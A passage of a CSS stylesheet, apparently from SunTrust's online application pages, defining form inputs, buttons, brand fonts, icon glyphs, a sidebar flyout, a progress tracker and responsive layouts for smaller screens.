    padding: 4px 12px;
    text-align: left;
    transition: background 0.15s ease-in 0s;
    margin-right: .5em;
}


    .button-inline:disabled,
    .button-inline:disabled:hover,
    .button-inline:disabled:active,
    .button-inline:disabled:focus {
        text-decoration: none;
        border: 0px solid #eee;
        background-color: rgb(153, 175, 198);
    }


    /* make default "Delete" button invisible when it's disabled */
    .button-inline.del:disabled,
    .button-inline.del:disabled:hover,
    .button-inline.del:disabled:active,
    .button-inline.del:disabled:focus {
        text-decoration: none;
        border: 0px solid #fff;
        background-color: #fff;
        transition: none;
    }


    .button-inline:hover {
        background: #00294d;
        transition: background 0.05s ease-in 0s;
    }

/* Native SELECT,OPTION */


select,
input[type=text],
input[type=email],
input[type=url],
input[type=password],
input[type=color],
input[type=date],
input[type=datetime],
input[type=datetime-local],
input[type=email],
input[type=month],
input[type=number],
input[type=range],
input[type=search],
input[type=tel],
input[type=time],
input[type=url],
input[type=week],
textarea {
    border: 1px solid rgb(204, 204, 204);
    border-radius: 4px;
    box-sizing: border-box;
    -moz-box-sizing: border-box;
    color: rgb(51, 51, 51);
    font-family: "suntrustregular", "Trebuchet MS", sans-serif;
    font-size: 16px;
    padding: 0px 10px 0px 10px;
    height: 40px;
    width: 60%;
    /* Zero out the gradients that are the default for a couple of native form controls in some browsers */
    background: -moz-linear-gradient(top, #fff 0%, #fff 100%); /* FF3.6+ */
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#fff), color-stop(100%,#fff)); /* Chrome,Safari4+ */
    background: -webkit-linear-gradient(top, #fff 0%,#fff 100%); /* Chrome10+,Safari5.1+ */
    background: -o-linear-gradient(top, #fff 0%,#fff 100%); /* Opera 11.10+ */
    background: -ms-linear-gradient(top, #fff 0%,#fff 100%); /* IE10+ */
    background: linear-gradient(to bottom, #fff 0%,#fff 100%); /* W3C */
}

/* undo previous height restriction for textarea */
textarea {
    height: auto;
    padding: 10px;
}


/* background image to re-add arrow to selects */
select, select:focus {
    -webkit-appearance: none;
    -moz-appearance: none;
    text-indent: 0.01px;
    text-overflow: '';
    background: url("../images/inputbg-select.png") no-repeat scroll right center rgba(0, 0, 0, 0) !important;
    background-position: 100% 50%;
    padding-left: 5px;
    padding-right: 20px;
}

.touchdev select, .touchdev select:focus {
    padding-left: 10px;
}

.ie select, .ie select:focus, .ie-plus select, .ie-plus select:focus {
    padding: 0 0 0 10px;
}

.ie .bootstrap select, .ie .bootstrap select:focus, .ie-plus .bootstrap select, .ie-plus .bootstrap select:focus {
    padding: 0 0 0 10px;
}


.select-combo select {
    width: 30%;
    display: inline-block;
}

.mini select {
    max-width: 100px;
    display: inline-block;
}

select:disabled,
input[type=text]:disabled,
input[type=email]:disabled,
input[type=url]:disabled,
input[type=password]:disabled,
input[type=color]:disabled,
input[type=date]:disabled,
input[type=datetime]:disabled,
input[type=datetime-local]:disabled,
input[type=email]:disabled,
input[type=month]:disabled,
input[type=number]:disabled,
input[type=range]:disabled,
input[type=search]:disabled,
input[type=tel]:disabled,
input[type=time]:disabled,
input[type=url]:disabled,
input[type=week]:disabled,
textarea:disabled {
    border: 0 !important;
    position: relative;
    top: 1px;
    background: url("../images/inputbg-select.png") no-repeat scroll -30px center rgba(0, 0, 0, 0) !important;
    color: #333;
    zoom: 1;
    filter: alpha(opacity=100);
    opacity: 1;
}

input[type="text"][disabled] {
    color: #333;
}


.combo-container select,
.combo-container input[type=text],
.combo-container input[type=email],
.combo-container input[type=url],
.combo-container input[type=password],
.combo-container input[type=color],
.combo-container input[type=date],
.combo-container input[type=datetime],
.combo-container input[type=datetime-local],
.combo-container input[type=email],
.combo-container input[type=month],
.combo-container input[type=number],
.combo-container .dollar-amount input[type=number],
.combo-container input[type=range],
.combo-container input[type=search],
.combo-container input[type=tel],
.combo-container input[type=time],
.combo-container input[type=url],
.combo-container input[type=week],
.combo-container textarea {
    width: 100%;
}

.combo-container {
    width: 60%;
    display: inline-block; /* for browsers that cannot handle flexbox */
    display: inline-flex;
}

    .combo-container select {
        padding-right: -webkit-calc(0% + 20px);
        padding-right: -moz-calc(0% + 20px);
    }

    .combo-container .a, .combo-container .b {
        width: 50%;
        float: left;
    }

    .combo-container.phone-combo .a {
        width: 40%;
    }

    .combo-container.phone-combo .b {
        width: 60%;
    }

    .combo-container.citystate-combo .a {
        width: 65%;
    }

    .combo-container.citystate-combo .b {
        width: 35%;
    }


/* tweaks for older versions of IE including IE9 (cannot handle flexbox) */
.ie .combo-container {
    display: inline-block;
}

    .ie .combo-container .a, .ie .combo-container .b {
        float: left;
    }

    .ie .combo-container + .input-error {
        position: relative;
        top: -12px;
        left: 1px;
    }

        .ie .combo-container + .input-error + .error-message {
            position: relative;
            top: -4px;
        }

/* allow <option> content to dictate select width in ie8 (ugly, but prevents them from being cut off)  */

.ie8 select {
    width: auto !important;
    padding-right: 0 !important;
}
/* end flexbox tweaks */


input[type=text].mi {
    width: 3em;
}





/* hide number spinners in Chrome and in Firefox  */
input[type=number]::-webkit-inner-spin-button,
input[type=number]::-webkit-outer-spin-button {
    -webkit-appearance: none;
    margin: 0;
}

input[type=number] {
    -moz-appearance: textfield;
}



    select:focus,
    input[type=text]:focus,
    input[type=email]:focus,
    input[type=url]:focus,
    input[type=password]:focus,
    input[type=color]:focus,
    input[type=date]:focus,
    input[type=datetime]:focus,
    input[type=datetime-local]:focus,
    input[type=email]:focus,
    input[type=month]:focus,
    input[type=number]:focus,
    input[type=range]:focus,
    input[type=search]:focus,
    input[type=tel]:focus,
    input[type=time]:focus,
    input[type=url]:focus,
    input[type=week]:focus,
    textarea:focus {
        outline: 0;
        border-color: #4697e4;
    }


.hasError select,
.hasError input[type=text],
.hasError input[type=email],
.hasError input[type=url],
.hasError input[type=password],
.hasError input[type=color],
.hasError input[type=date],
.hasError input[type=datetime],
.hasError input[type=datetime-local],
.hasError input[type=email],
.hasError input[type=month],
.hasError input[type=number],
.hasError input[type=range],
.hasError input[type=search],
.hasError input[type=tel],
.hasError input[type=time],
.hasError input[type=url],
.hasError input[type=week],
.hasError textarea,
.hasError .inputTags-list {
    border-color: #ff3300;
    border-width: 2px;
}



/* load fonts for SunTrust text (FS Albert) */
@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-webfont.eot');
    src: url('../fonts/fs_albert-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-webfont.woff') format('woff'), url('../fonts/fs_albert-webfont.ttf') format('truetype'), url('../fonts/fs_albert-webfont.svg#suntrustregular') format('svg');
    font-weight: normal;
    font-style: normal;
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-bold-webfont.eot');
    src: url('../fonts/fs_albert-bold-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-bold-webfont.woff') format('woff'), url('../fonts/fs_albert-bold-webfont.ttf') format('truetype'), url('../fonts/fs_albert-bold-webfont.svg#suntrustregular') format('svg');
    font-weight: 700;
    font-style: normal;
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-bolditalic-webfont.eot');
    src: url('../fonts/fs_albert-bolditalic-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-bolditalic-webfont.woff') format('woff'), url('../fonts/fs_albert-bolditalic-webfont.ttf') format('truetype'), url('../fonts/fs_albert-bolditalic-webfont.svg#suntrustregular') format('svg');
    font-weight: 700;
    font-style: italic;
}

/*
@font-face {
	font-family: 'suntrustregular';
	src: url('../fonts/fs_albert-thin.eot');
	src: url('../fonts/fs_albert-thin.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-thin.woff') format('woff'), url('../fonts/fs_albert-thin.ttf') format('truetype'), url('../fonts/fs_albert-thin.svg#suntrustregular') format('svg');
	font-weight: 100;
	font-style: normal;
}
*/

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-italic-webfont.eot');
    src: url('../fonts/fs_albert-italic-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-italic-webfont.woff') format('woff'), url('../fonts/fs_albert-italic-webfont.ttf') format('truetype'), url('../fonts/fs_albert-italic-webfont.svg#suntrustregular') format('svg');
    font-weight: normal;
    font-style: italic;
}

/* font icons - OLB */

@font-face {
    font-family: 'olb-icons';
    font-style: normal;
    font-weight: normal;
    src: url("../fonts/suntrust-icons-7.eot");
    src: url("../fonts/suntrust-icons-7.eot?#iefix") format('embedded-opentype'), url("../fonts/suntrust-icons-7.woff") format('woff'), url("../fonts/suntrust-icons-7.ttf") format('truetype'), url("../fonts/suntrust-icons-7.svg") format('svg');
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-webfont.eot');
    src: url('../fonts/fs_albert-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-webfont.woff') format('woff'), url('../fonts/fs_albert-webfont.ttf') format('truetype'), url('../fonts/fs_albert-webfont.svg#suntrustregular') format('svg');
    font-weight: normal;
    font-style: normal;
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-bold-webfont.eot');
    src: url('../fonts/fs_albert-bold-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-bold-webfont.woff') format('woff'), url('../fonts/fs_albert-bold-webfont.ttf') format('truetype'), url('../fonts/fs_albert-bold-webfont.svg#suntrustregular') format('svg');
    font-weight: 700;
    font-style: normal;
}

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-bolditalic-webfont.eot');
    src: url('../fonts/fs_albert-bolditalic-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-bolditalic-webfont.woff') format('woff'), url('../fonts/fs_albert-bolditalic-webfont.ttf') format('truetype'), url('../fonts/fs_albert-bolditalic-webfont.svg#suntrustregular') format('svg');
    font-weight: 700;
    font-style: italic;
}

/*
@font-face {
	font-family: 'suntrustregular';
	src: url('../fonts/fs_albert-thin.eot');
	src: url('../fonts/fs_albert-thin.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-thin.woff') format('woff'), url('../fonts/fs_albert-thin.ttf') format('truetype'), url('../fonts/fs_albert-thin.svg#suntrustregular') format('svg');
	font-weight: 100;
	font-style: normal;
}
*/

@font-face {
    font-family: 'suntrustregular';
    src: url('../fonts/fs_albert-italic-webfont.eot');
    src: url('../fonts/fs_albert-italic-webfont.eot?#iefix') format('embedded-opentype'), url('../fonts/fs_albert-italic-webfont.woff') format('woff'), url('../fonts/fs_albert-italic-webfont.ttf') format('truetype'), url('../fonts/fs_albert-italic-webfont.svg#suntrustregular') format('svg');
    font-weight: normal;
    font-style: italic;
}


/* font icons - suntrust.com */
@font-face {
    font-family: "sun-icons";
    src: url("../fonts/sun-icons-a4.eot");
    src: url("../fonts/sun-icons-a4.eot?#iefix") format("embedded-opentype"), url("../fonts/sun-icons-a4.woff") format("woff"), url("../fonts/sun-icons-a4.ttf") format("truetype"), url("../fonts/sun-icons-a4.svg?#sun-icons") format("svg");
    font-weight: normal;
    font-style: normal;
}


.sti-icon:before {
    background-clip: padding-box;
    border-radius: 30px;
    border-style: solid;
    border-width: 1px;
    display: inline-block;
    font-size: 14px;
    height: 30px;
    line-height: 30px;
    margin: 0 10px 7px 0;
    text-align: center;
    vertical-align: middle;
    width: 30px;
    color: #aaa;
}

.icon-call:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f114";
    text-indent: 1px;
}

.icon-email:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f110";
    line-height: 36px;
}

.icon-chat:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f119";
}

.icon-privacy:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f10e";
}

.icon-save:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e01e";
}

.icon-retrieve:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e02f";
}

/* disabled style deactivates the link */
.sti-icon.disabled {
    opacity: .33;
    pointer-events: none;
    cursor: default;
}

.content-copy {
    padding: 0 10px;
}

.sub-content-copy {
    padding: 0 20px;
}

.footer-icon:before {
    display: inline-block;
    font-size: 14px;
    height: 14px;
    margin: 0 5px 0 4px;
    width: 15px;
    color: #999;
}

.icon-privacy-footer:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f10e";
}

.img-width {
    width: 50%;
}

.cc-offer-ul {
    margin-bottom: -10px;
    margin-top: -10px;
}

.linebreak-label {
    display: none;
}

.switch-section .label-inline {
    display: inline-block;
}

.accept-tick {
    display: inline-block;
    float: right;
    padding: 10px;
}


    .accept-tick:before {
        content: "?";
        color: #339900;
        font-family: 'ZapfDingbatsITC', 'Zapf Dingbats';
    }

    .accept-tick:after {
        content: " Accepted";
        color: #339900;
        font-family: 'TrebuchetMS', 'Trebuchet MS';
        clear: both;
    }

.switch-section .input-control-custom {
    display: inline-block;
    width: auto;
    float: right;
}

.img-width {
    width: 50%;
}

@media (min-width: 800px) and (max-width: 1024px) {
    .percent-icon {
        left: 130px !important;
    }
}

/* ****************************************************************************************** */
/* ***********************   DESIGN EDITS FOR ANYTHING BELOW 1024px   *********************** */
/* ****************************************************************************************** */

@media (max-width: 1024px) {

    html, body {
    }

    .bootstrap .field-icon a {
        position: relative;
        z-index: 1;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        /*position: absolute;*/
        float: right;
        right: 30px;
        bottom: 30px;
    }
    /*Chandra Start - 6/14 */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }


    .clickable-div {
        cursor: pointer;
    }

    .bootstrap .row-spacing {
        margin-top: 30px;
    }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }
    /* chandra - 6/14 End */
    .sub-label {
        color: #C94C06; /* was #ccc - darkened for WCAG AA compliance */
        font-size: 14px;
        font-weight: normal;
        line-height: normal;
    }

    .input-label {
        display: inline-block;
        font-weight: bold;
        text-align: left;
        width: 100%;
        padding-top: 11px;
        vertical-align: top;
    }

    .review-value {
        font-size: 20px;
        padding-top: 0px;
        font-weight: normal;
        line-height: 22px;
        max-width:  320px;
        word-wrap:  break-word;
    }
    /*****Chandra End******/
    .page {
        width: 100%;
        margin-top: 0;
    }

    .main-content.no-progress {
        /* border:0; */
    }

    .content-copy {
    }

    .sub-content-copy {
    }

    .mobile-only-content {
        display: block;
    }

    .pdf-content {
        margin-bottom: 2.5em;
    }

    /* footer-arc specs */

    .right-rounded-footer {
        display: none;
    }

    .left-rounded-footer {
        background-image: url("../images/left-and-right-arc.png");
        background-position: left bottom;
        background-size: contain;
        bottom: 0;
        width: 100%;
    }


    /* Mobile App Download widget dispay on non-desktop resolutions */

    .dl-app {
        display: inline-block;
    }



    /* sidebar flyout for smaller screens */

    div.menu-link {
        display: inline-block;
        position: absolute;
        top: 37px;
        right: 25px;
    }

        div.menu-link:before {
            font-family: "olb-icons";
            font-weight: normal;
            font-style: normal;
            text-decoration: inherit;
            content: "\e038";
            font-size: 20px;
            color: #aaa;
            border: 2px solid #aaa;
            border-radius: 50%;
            padding: 12px 10px 7px 10px;
        }

        div.menu-link.active {
            display: none;
        }

    div.close-link {
        display: inline-block;
        color: #fff;
        position: relative;
        left: 152px;
        top: 15px;
    }

    .sidebar {
        z-index: 1000000000;
    }

    .sidebar-content {
        padding: 0;
        border: 0;
        width: 210px;
        margin-top: 2em;
    }

    .sidebar-container {
        -webkit-transition: all 0.3s ease-out;
        -moz-transition: all 0.3s ease-out;
        -ms-transition: all 0.3s ease-out;
        -o-transition: all 0.3s ease-out;
        transition: all 0.3s ease-out;
    }

    .sidebar-container {
        background-color: rgb(13, 54, 90);
        color: #fff;
        padding: 1em;
        clear: both;
        width: 1000px;
        height: 100%;
        position: fixed;
        top: 0px;
        margin: 0;
        border: 0;
        right: -1245px;
        z-index: 1000000000;
        opacity: 0.98;
        filter: alpha(opacity=98);
    }

        .sidebar-container.active {
            right: -775px;
            box-shadow: -4px 3px 3px rgba(0, 0, 0, 0.06);
        }

        .sidebar-container h3 {
            color: #fff;
        }

        .sidebar-container ul {
            padding: 0;
            margin: 0 0 3em .5em;
        }

            .sidebar-container ul.selections {
                padding: 0;
                margin: 0 0 3em .5em;
            }

                .sidebar-container ul.selections .icon-checkmark:before {
                    margin-right: 1em;
                    margin-left: .5em;
                    float: left;
                }

                .sidebar-container ul.selections li {
                    padding-left: 41px;
                }

                    .sidebar-container ul.selections li:before {
                        color: rgb(173, 201, 232);
                        padding-left: 0;
                    }


            .sidebar-container ul.questions a:link, .sidebar ul.questions a:hover, .sidebar ul.questions a:visited, .sidebar ul.questions a:active,
            .sidebar-container ul.save-retrieve a:link, .sidebar ul.save-retrieve a:hover, .sidebar ul.save-retrieve a:visited, .sidebar ul.save-retrieve a:active {
                text-decoration: none;
                color: rgb(173, 201, 232);
            }

            .sidebar-container ul.questions a:hover, .sidebar-container ul.save-retrieve a:hover {
                text-decoration: none;
                color: #fff;
            }

            .sidebar-container ul.selections.finished li:before {
                color: rgb(173, 201, 232);
            }

    .sti-icon:link:before, .sti-icon:active:before, .sti-icon:visited:before {
        color: rgb(173, 201, 232);
    }

    .sidebar-container ul.status li.complete:before {
        color: rgb(173, 201, 232);
    }

    li#chat-link {
        display: none;
    }

    select,
    input[type=text],
    input[type=email],
    input[type=url],
    input[type=password],
    input[type=color],
    input[type=date],
    input[type=datetime],
    input[type=datetime-local],
    input[type=email],
    input[type=month],
    input[type=number],
    input[type=range],
    input[type=search],
    input[type=tel],
    input[type=time],
    input[type=url],
    input[type=week],
    textarea {
        /* max-width: 250px;*/
    }

    .select-combo select {
        max-width: 125px;
    }

    .combo-container {
        max-width: 250px;
    }

    .segmented .label {
        max-width: 83px; /* changed from 81px to fit better */
    }
}

@media (min-width: 767px) and (max-width: 940px) {
    .bootstrap .field-icon a {
        position: relative;
        z-index: 1;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        /* position: absolute; */
        float: right;
        right: 15px;
        bottom: 30px;
    }
}

@media (min-width: 650px) and (max-width: 767px) {
    .promo-sidebar {
        position: absolute !important;
        top: 55px;
        padding-top: 20px;
    }

    .promo-toggle-section {
        padding-bottom: 100px;
    }
}

@media (max-width: 767px) {

    html, body {
    }

    .clickable-div {
        cursor: pointer;
    }

    .bootstrap .field-icon a {
        position: relative;
        z-index: 1;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        /*position: absolute;*/
        float: right;
        right: 15px;
        bottom: 30px;
    }

    .LoginModal .bootstrap .field-icon a {
        position: relative;
        z-index: 1;
        font-family: suntrustregular;
        color: #005EAD;
        font-size: 12px;
        /*position: absolute;*/
        float: right;
        right: 20px;
        top: 30px;
    }

    .Additionalowners-label {
        font-size: 20px;
    }

    .owners-list {
        display: block;
    }

    .Additionalowners-checklist-label {
        font-size: 15px !important;
    }

    .owners-list .checkbox input[type="checkbox"] + label {
        font-size: 15px !important;
    }

    .Additionalowners-email-text {
        font-size: 12px;
    }
    /*.Additionalowners-email {
    width:80% !important;
    }
    .Additionalowners-percent {
    width:15% !important;
    }*/
    .mobile-show {
        display: block !important;
    }

    .mobile-hide {
        display: none !important;
    }

    .mobile-show .hrMiddle {
        margin: 25px 0;
    }

    .Additionalowners {
        padding-top: 30px;
        padding-left: 20px;
        padding-right: 20px;
        padding-bottom: 30px;
    }




    /*Chandra Start - 6/14 */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            margin-top: 0px;
        }


    /*.promo-header{
    margin-bottom: 85px !important;
}*/
    .promo-link {
        font-size: 15px;
    }

    .promo-details {
        margin-bottom: 0px !important;
        font-size: 20px !important;
    }

    .remove-promo {
        width: 10px;
        height: 10px;
        position: relative;
        top: -4px;
    }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }

    .suntrust-login-heading {
        font-size: 25px;
    }

    .LoginModal .modal-content {
        width: 290px;
    }

    .suntrust-login-heading-sublabel {
        font-size: 15px;
    }

    .percent-icon {
        left: 100px !important;
    }
}



/* ****************************************************************************************** */
/* ***********************   DESIGN EDITS FOR ANYTHING BELOW 650px   *********************** */
/* ****************************************************************************************** */

@media (max-width: 650px) {

    html, body {
    }

    .clickable-div {
        cursor: pointer;
    }

    .button-offers {
        display: block;
    }

    .ad-row.card-offer {
        margin-top: 0;
        margin-bottom: -40px;
    }

    .percent-icon {
        left: 90px !important;
    }

    .page {
    }
    /* chandra - 6/14 Start */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            margin-top: 0px;
        }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }
    /* chandra - 6/14 End */
    .main-content.no-progress {
        border: 0;
    }

    .header-container {
        padding: 15px 10px;
        transition: all 0s ease 0s;
        box-shadow: none;
    }

        .header-container .header-logo-container {
            text-align: left;
        }


    header .header-logo {
        display: block;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
        background: url(../images/suntrust-logo-white.svg) no-repeat;
        width: 140px;
        /* Width of new image */
        height: 30px;
        /* Height of new image */
        /* Equal to width of new image */
        margin-left: auto;
        margin-right: auto;
    }

    .header-container .header-logo-container .header-card-benefits {
        position: absolute;
        float: left;
        color: white;
        cursor: pointer;
        font-size: 12px;
        padding: 8px;
        background: #E6772C 0% 0% no-repeat padding-box;
        border-radius: 4px;
        opacity: 1;
    
}

.arrow {
    display: none;
}

.arrow-down {
    transform: rotate(180deg);
}

.card-benefits-content {
    position: absolute;
    z-index: 3;
    background-color: white;
    width: 100%;
}

    .card-benefits-content > div {
        margin-right: auto;
        margin-left: auto;
        max-width: 1000px;
        padding: 20px;
        box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.16);
    }

        .card-benefits-content > div > .card-benefits-header {
            /*width: 266px;*/
            height: 21px;
            font-size: 18px;
            color: #EE611F;
        }

        .card-benefits-content > div > .card-benefits-data {
            font-size: 12px;
            color: #333333;
        }

.card-benefits-data > p {
    padding-top: 20px;
    margin-left: 0px;
    padding-bottom: 20px;
    clear: both;
}

.card-benefits-data > ul > li {
    float: none;
    width: 100%;
    margin-left: 0;
}

.card-benefits-close {
    color: #005EAD;
    cursor: pointer;
    font-size: 15px;
    position: absolute;
    bottom: 5%;
    width: 34px;
    left: calc(50% - 17px);
}

.card-benefits-close-img {
    display: none;
}
    .citizenship-multiselect {
        width: calc(100% - 36px)!important;
    }

h3.question {
    padding: 10px;
    border-radius: 4px;
    margin: 2em 0 1em 0;
    border: 0;
    color: #333;
    background: #f4f4f4;
}


h3.legend, h3.legend.next-steps {
    padding: 2px 10px;
    border-radius: 4px;
    margin: 2em 0 1em 0;
    border: 0;
    color: #fff;
    letter-spacing: normal;
    font-size: 1em;
    font-weight: bold;
    background-color: #C94C06; /* -- dark orange, compliant w/ ADA */
    /* background-color: rgb(248, 161, 49); -- brand orange, non compliant w/ ADA */
}

    h3.legend + .switch-section {
        margin-top: 1em;
    }

    h3.legend + .content-copy {
        margin-top: 0;
    }


.Additionalowners-label {
    font-size: 20px;
}

.owners-list {
    display: block;
}

.Additionalowners-checklist-label {
    font-size: 15px !important;
}

.owners-list .checkbox input[type="checkbox"] + label {
    font-size: 15px !important;
}

.Additionalowners-email-text {
    font-size: 12px;
}

.Additionalowners-email {
    width: 80% !important;
}

.Additionalowners-percent {
    width: 30% !important;
}

.owners-list .checkbox input[type="checkbox"] + label:before {
    left: 0px !important;
}


.web_dialog {
    display: none;
    position: fixed;
    width: 80%;
    height: auto;
    top: 25%;
    left: 50%;
    margin-left: -40%;
    margin-top: -100px;
    background-color: #fff;
    border: 3px solid #fff;
    border-radius: 4px;
    padding: 20px;
    z-index: 9999999999102;
}

.offer-card > .row > .col-md-6:first-child {
    padding-bottom: 30px;
}

.offer-card .card-body {
    padding-left: 24px !important;
}

.offer-card .card-pdf {
    padding-left: 24px !important;
}

.offer-card .checkbox input[type="checkbox"] + label:before {
    left: 24px !important;
}

.offer-card .checkbox input[type="checkbox"] + label {
    padding-left: 20px;
    font-size: 15px;
}

.offer-card .promo-header {
    font-size: 20px;
}

.offer-card .checkbox input[type="checkbox"] {
    top: 8px;
    left: 10px;
    position: relative;
}

.promo-toggle-section {
    padding-bottom: 100px;
}

.promo-sidebar {
    position: absolute !important;
    top: 55px;
    padding-top: 20px;
}
/* hide tutorial from smaller screens */

.tutorial {
    display: none !important;
}


.main-container {
    /*    padding-top:55px;  TESTING */
}



/* Reset progress tracker styles */
.progress-tracker {
    list-style: none;
    margin: 0;
    padding: 0;
    white-space: inherit;
    display: inline;
    width: auto;
}

    .progress-tracker > .item {
        display: inline;
        position: inherit;
        padding: 0;
        color: #707070;
        background: none;
        display: inline;
    }

        .progress-tracker > .item > p {
            display: none;
        }

        .progress-tracker > .item:after, .progress-tracker > .item:before {
            border: 0;
        }

        .progress-tracker > .item:first-child, .progress-tracker > .item:last-child {
            padding: 0;
        }

        .progress-tracker > .item.active {
            color: #ee6120;
            background: none;
        }

/* Make new progress tracker styles */

.progress-tracker-container {
    text-align: center;
    margin: 1em 0 0 0;
}

.progress-tracker > .item:before, .progress-tracker > .item:first-child:before {
    content: "";
    position: inherit;
    display: inline-block;
    border: 1px solid #ccc;
    background: #fff;
    color: #aaa;
    font-size: 2rem;
    font-weight: 700;
    padding: 5px 10px;
    margin: 0 2px;
    border-radius: 50%;
}

.progress-tracker > .item.active:before {
    border-color: #d66112;
    background-color: #d66112; /* -- dark orange, compliant w/ ADA */
    /* background-color: rgb(248, 161, 49); -- brand orange, non compliant w/ ADA */
    color: #fff;
}

.progress-tracker > .item:first-child:before {
    content: "1";
}

.progress-tracker > .item:nth-child(2):before {
    content: "2";
}

.progress-tracker > .item:nth-child(3):before {
    content: "3";
}

.progress-tracker > .item:nth-child(4):before {
    content: "4";
}

.progress-tracker > .item:nth-child(5):before {
    content: "5";
}

.progress-tracker > .item:nth-child(6):before {
    content: "6";
}

.progress-tracker > .item:nth-child(7):before {
    content: "7";
}


div.menu-link {
    top: 20px;
    right: 15px;
}

    div.menu-link:before {
        font-size: 1.4rem;
        color: #fff;
        border: 2px solid #fff;
    }

div.close-link {
    left: 165px;
    top: 0;
}

div.sidebar-content {
    margin-top: 0;
}

/* Segmented control on Getting Started page */


.segmented .label {
    width: 33.333%;
    max-width: none;
}

.segmented.business .label {
    width: 50%;
    max-width: none;
}

.input-control.forgot-useridpw {
    padding: 0;
    left: 10px;
    margin-bottom: 20px;
}


.offer-box {
    padding: 15px 10px;
    margin: 25px -10px 15px -10px;
    border: 0px solid #eee;
}

/*
.offer-box-copy:before {
    content: "\25BA";
    color:#ccc;
    font-size: 100%;
    display: inline-block;
    pointer-events: none;
    padding:0 10px 0 0;
   
}
*/

.promocode-trigger {
    left: 10px;
}

#delete-field {
    left: -71px;
}

#df-control {
}


.forgot-link a {
    display: inline-block;
    float: right;
    margin-right: 36px;
}

#client-yesno .radio-combos {
    top: 0;
}

#client-yesno .input-error {
    left: 5px;
}

.inline-radio .error-message {
    width: 100%;
}

.input-row.inline-radio .input-control .radio-combos {
    font-size: 16px; /* tweak font size to circumvent iPhone auto-zoom */
    padding: 0px 10px 0px 10px;
    width: 85%;
    width: -moz-calc(100% - 36px);
    width: -webkit-calc(100% - 36px);
    width: calc(100% - 36px);
    max-width: none;
}

.input-row.inline-radio .input-label, .input-row.inline-radio .input-control {
    /* margin-left:5px; */
}

    .input-row.inline-radio .input-label .sub-label {
        display: block;
        /*padding-left:10px;*/
    }


/* Disclosures PDF list */

